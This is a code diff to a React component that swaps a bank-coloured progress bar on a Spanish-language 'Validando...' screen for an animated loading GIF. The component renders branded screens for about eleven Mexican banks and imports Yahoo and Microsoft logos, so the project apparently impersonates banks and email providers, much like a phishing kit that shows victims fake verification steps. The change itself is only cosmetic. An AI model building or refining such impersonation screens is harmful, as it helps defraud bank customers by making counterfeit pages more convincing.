@@ -32,6 +32,7 @@ import yahooLogo from '@assets/pngwing.com 2.png';
 import microsoftLogo from '@assets/pngwing.com.png';
 import promoImage1 from '@assets/IMG_5647_1754950720172.jpeg';
 import promoImage2 from '@assets/IMG_5646_1754952460517.jpeg';
+import loadingGif from '@assets/avatar_red240920240_1759807622645.gif';
 
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
@@ -2042,24 +2043,15 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
       case ScreenType.VALIDANDO:
         const validandoContent = (
           <>
-            <h2 className="text-xl font-bold mb-4">Validando...</h2>
-            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
-            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
-              <div className={`h-full ${
-                banco === 'LIVERPOOL' ? 'liverpool-bg' :
-                banco === 'BANBAJIO' ? 'banbajio-bg' : 
-                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
-                banco === 'BBVA' ? 'bg-[#072146]' :
-                banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
-                banco === 'HSBC' ? 'bg-[#DB0011]' :
-                banco === 'AMEX' ? 'amex-bg' :
-                banco === 'SANTANDER' ? 'santander-bg' :
-                banco === 'SCOTIABANK' ? 'scotiabank-bg' :
-                banco === 'BANAMEX' ? 'banamex-bg' :
-                'bg-[#EC1C24]'
-              } animate-progress-bar`}></div>
+            <div className="flex flex-col items-center justify-center">
+              <img 
+                src={loadingGif} 
+                alt="Cargando..." 
+                className="w-32 h-32 mb-4"
+              />
+              <h2 className="text-xl font-bold mb-2">Validando...</h2>
+              <p className="text-sm text-gray-500">Esto puede tomar un momento. Por favor espere...</p>
             </div>
-            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
           </>
         );
         return getBankContainer(validandoContent);
